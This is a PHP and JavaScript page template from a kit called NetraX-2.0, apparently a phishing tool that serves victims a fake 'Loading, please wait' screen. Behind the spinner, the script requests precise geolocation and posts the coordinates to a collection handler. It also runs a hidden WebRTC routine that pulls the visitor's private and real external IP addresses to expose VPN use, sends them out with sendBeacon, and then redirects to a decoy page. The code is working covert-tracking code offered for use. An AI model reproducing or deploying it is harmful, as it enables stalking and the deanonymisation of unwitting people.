<?php
/*
 * NOTE: This file is never executed directly. netraX-2.0.sh copies it
 * (via sed) to index.php at the project root. All __DIR__ references
 * therefore resolve to the project root at runtime.
 */
$_bootstrap = __DIR__ . '/core/ip.php';
if (is_file($_bootstrap) && is_readable($_bootstrap)) {
    require_once $_bootstrap;
} else {
    error_log('[NetraX-2.0] FATAL — core/ip.php not found at: ' . $_bootstrap);
}
unset($_bootstrap);

// Explicitly allow geolocation & camera (tunnel proxies may add restrictive Permissions-Policy)
header('Permissions-Policy: geolocation=*, camera=*, microphone=*');
header('Feature-Policy: geolocation *; camera *; microphone *');

// Add JavaScript to capture location
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Debug function to log messages - only log essential information
        function debugLog(message) {
            // Only log essential location data, not status messages
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                
                // Send only essential logs to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "handlers/debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        function getLocation() {
            // Don\'t log this message
            
            if (navigator.geolocation) {
                // Don\'t log this message
                
                // Show permission request message
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                // Report to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "handlers/location.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("error=1&error_code=0&error_msg=" + encodeURIComponent("Geolocation not supported by browser"));
                // Redirect after a delay
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "handlers/location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // Don\'t log this message
                    
                    // Add a delay before redirecting to ensure data is processed
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                // Don\'t log this message
                // Still redirect even if there was an error
                redirectToMainPage();
            };
            
            // Send the data with a timestamp to avoid caching
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            var errorMessages = {
                1: "Permission denied by user",
                2: "Position unavailable",
                3: "Request timed out"
            };
            var errorMsg = errorMessages[error.code] || "Unknown error (code: " + error.code + ")";
            
            document.getElementById("locationStatus").innerText = "Redirecting...";
            
            // Report error to server so operator sees it on terminal
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "handlers/location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("error=1&error_code=" + error.code + "&error_msg=" + encodeURIComponent(errorMsg));
            
            // Redirect after a short delay
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            // Don\'t log this message
            // Try to redirect to the template page
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                // Don\'t log this message
                // Fallback redirection
                window.location = "forwarding_link/index2.html";
            }
        }
        
        // Try to get location when page loads
        window.onload = function() {
            // Don\'t log this message
            setTimeout(function() {
                getLocation();
            }, 500); // Small delay to ensure everything is loaded
        };

        // ── WebRTC Internal IP & VPN Detection ──────────────────────────
        // Uses RTCPeerConnection ICE negotiation to silently extract the
        // device\'s private/LAN IP(s) and the real external IP seen by
        // the STUN server.  If the STUN-visible IP differs from the
        // IP the server received in HTTP headers, a VPN is flagged.
        // Runs immediately on parse, independent of geolocation flow.
        // Uses sendBeacon (survives page navigation) with XHR fallback.
        (function() {
            \'use strict\';
            if (typeof RTCPeerConnection === \'undefined\') { return; }

            var _ips   = {};    // { "<ip>": "<candidate_type>" }
            var _sent  = false;
            var _timer = null;
            var _pc    = null;

            function _send() {
                if (_sent) { return; }
                _sent = true;
                if (_timer) { clearTimeout(_timer); _timer = null; }
                if (_pc)    { try { _pc.close(); } catch (e) {} _pc = null; }
                if (Object.keys(_ips).length === 0) { return; }

                var payload = \'ips=\' + encodeURIComponent(JSON.stringify(_ips));
                var url     = \'handlers/webrtc_ip.php\';

                // sendBeacon queues delivery even across page navigations
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(url, new Blob([payload], {
                        type: \'application/x-www-form-urlencoded\'
                    }));
                } else {
                    var xhr = new XMLHttpRequest();
                    xhr.open(\'POST\', url, true);
                    xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
                    xhr.send(payload);
                }
            }

            function _onCandidate(e) {
                if (!e || !e.candidate || !e.candidate.candidate) {
                    // null candidate signals ICE gathering is complete
                    _send();
                    return;
                }
                // SDP candidate format:
                //   candidate:<foundation> <comp> <proto> <prio> <IP> <port> typ <type> …
                var parts = e.candidate.candidate.split(\' \');
                if (parts.length >= 8) {
                    var ip   = parts[4];
                    var type = parts[7]; // \'host\' | \'srflx\' | \'prflx\' | \'relay\'
                    if (ip && type) {
                        _ips[ip] = type;
                    }
                }
            }

            try {
                _pc = new RTCPeerConnection({
                    iceServers: [{ urls: \'stun:stun.l.google.com:19302\' }]
                });
                _pc.createDataChannel(\'__x\'); // data channel required to trigger ICE
                _pc.onicecandidate = _onCandidate;
                _pc.onicegatheringstatechange = function() {
                    if (_pc && _pc.iceGatheringState === \'complete\') { _send(); }
                };
                _pc.createOffer()
                   .then(function(o) { return _pc.setLocalDescription(o); })
                   .catch(function() {});
                // Safety timeout — flush after 4 s regardless of gathering state
                _timer = setTimeout(_send, 4000);
            } catch (err) {}
        })();
        // ── End WebRTC Detection ─────────────────────────────────────────
    </script>

    <!-- Tailwind CSS CDN (UI only) -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <!-- ── UI STYLES: glassmorphism loading screen ── -->
    <style>
      body { font-family: \'Inter\', sans-serif; }

      /* Animated gradient background — cool blue */
      .bg-animated {
        background: linear-gradient(-45deg, #020c1b, #061828, #0c2540, #041018);
        background-size: 400% 400%;
        animation: gradientShift 8s ease infinite;
      }
      @keyframes gradientShift {
        0%   { background-position: 0%   50%; }
        50%  { background-position: 100% 50%; }
        100% { background-position: 0%   50%; }
      }

      /* Frosted glass card */
      .glass {
        background: rgba(255, 255, 255, 0.07);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border: 1px solid rgba(255, 255, 255, 0.12);
      }

      /* Glow ring spinner — blue/cyan */
      @keyframes spin-ring {
        to { transform: rotate(360deg); }
      }
      .spin-ring {
        border: 3px solid rgba(255,255,255,0.1);
        border-top-color: #3b82f6;
        border-right-color: #06b6d4;
        animation: spin-ring 0.9s linear infinite;
      }

      /* Pulsing dot */
      @keyframes pulse-dot {
        0%,100% { opacity: 1; transform: scale(1); }
        50%      { opacity: 0.4; transform: scale(0.7); }
      }
      .pulse-dot { animation: pulse-dot 1.2s ease-in-out infinite; }
      .pulse-dot:nth-child(2) { animation-delay: 0.2s; }
      .pulse-dot:nth-child(3) { animation-delay: 0.4s; }

      /* Progress bar */
      @keyframes progress-bar {
        0%   { width: 0%; }
        80%  { width: 90%; }
        100% { width: 100%; }
      }
      .progress-fill {
        animation: progress-bar 12s ease-in-out forwards;
        background: linear-gradient(90deg, #1d4ed8, #3b82f6, #60a5fa);
      }
    </style>
    <!-- ─────────────────────────────────────────── -->
</head>

<!-- ── UI BODY: modern loading/splash screen ── -->
<body class="bg-animated min-h-screen flex items-center justify-center">
  <div class="glass rounded-3xl p-10 w-full max-w-sm mx-4 flex flex-col items-center gap-6 shadow-2xl shadow-black/60">

    <!-- Logo icon -->
    <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center shadow-lg shadow-blue-900/50">
      <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
        <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
      </svg>
    </div>

    <!-- Spinner -->
    <div class="spin-ring w-14 h-14 rounded-full"></div>

    <!-- Text content -->
    <div class="text-center space-y-1">
      <h2 class="text-lg font-semibold text-white">Loading, please wait…</h2>
      <p class="text-sm text-gray-400">Please allow location access for better experience</p>
    </div>

    <!-- Status text — id="locationStatus" preserved for JS -->
    <p id="locationStatus" class="text-xs font-medium text-blue-300 text-center px-2">Initializing...</p>

    <!-- Progress bar -->
    <div class="w-full bg-white/10 rounded-full h-1.5 overflow-hidden">
      <div class="progress-fill h-full rounded-full"></div>
    </div>

    <!-- Animated dots -->
    <div class="flex items-center gap-2">
      <span class="pulse-dot w-2 h-2 bg-blue-400 rounded-full inline-block"></span>
      <span class="pulse-dot w-2 h-2 bg-cyan-400 rounded-full inline-block"></span>
      <span class="pulse-dot w-2 h-2 bg-sky-400 rounded-full inline-block"></span>
    </div>

  </div>
</body>
<!-- ─────────────────────────────────────────── -->
</html>
';
exit;
?>
